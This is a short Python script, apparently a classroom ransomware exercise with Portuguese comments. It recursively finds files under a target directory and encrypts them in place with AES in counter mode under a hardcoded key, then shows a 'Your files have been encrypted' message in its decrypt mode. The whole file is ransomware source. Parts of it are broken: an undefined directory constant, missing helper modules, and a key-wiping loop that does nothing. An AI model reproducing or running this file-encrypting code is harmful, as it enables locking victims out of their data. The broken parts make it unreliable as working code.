#-*- coding: utf-8 -*-

from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os
import Discovery
import Crypter


#a senha pode ter os seguintes tamanhos: 128, 192, 256 bits
#cada unicode tem 1 byte
#8 bits = 1 byte = 1 letra unicode

HARDCODED_KEY = 'topicosespeciaisderedecomputador'

def arg_parser():
	parser = argparse.ArgumentParser(description="mrRobot")
	parser.add_argument('-d', '--decrypt', help='decripta os arquivos [default: no]', action='store_true')
	return parser

def main():
	parser = arg_parser()
	args = vars(parser.parse_args())
	decrypt = args['decrypt']

	if decrypt:
		print('''
			----------------------
            Your files have been encrypted.
            To decrypt them, use the following password '{}'	
			'''.format(HARDCODED_KEY))
		
		key = input('Password > ')
	else:
		if HARDCODED_KEY:
			key = HARDCODED_KEY

	ctr = Counter.new(128)
	crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

	if not decrypt:
		cryptFn = crypt.encrypt
	else:
		cryptFn = crypt.decrypt

	init_path = os.path.abspath(os.path.join(os.getcwd(), DIR_NAME)) 
	startDirs = [init_path]

	for currentDir in startDirs:
		for filename in Discovery.discover(currentDir):
			Crypter.change_files(filename, cryptFn)

	#limpa a chave de criptografia da memória
	for _ in range(100):
		pass
	if not decrypt:
		pass



if __name__ == '__main__':
	main()











